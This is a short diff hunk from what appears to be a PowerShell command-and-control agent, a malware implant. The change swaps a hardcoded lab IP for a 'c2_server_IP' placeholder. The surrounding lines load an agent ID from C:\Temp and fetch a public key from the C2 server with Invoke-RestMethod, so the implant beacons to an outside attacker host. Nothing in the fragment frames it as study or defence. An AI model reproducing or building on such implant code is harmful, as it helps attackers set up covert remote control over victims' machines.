@@ -107,7 +107,7 @@ Function Send-Result {
 Try {
     $AgentIDFilePath = "C:\Temp\agent_id.txt"
     $AgentID = Load-AgentID -FilePath $AgentIDFilePath
-    $C2Url = "http://10.0.2.4:8000"
+    $C2Url = "http://c2_server_IP:8000"
 
     Write-Host "[*] Fetching Public Key from C2 Server..."
     $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
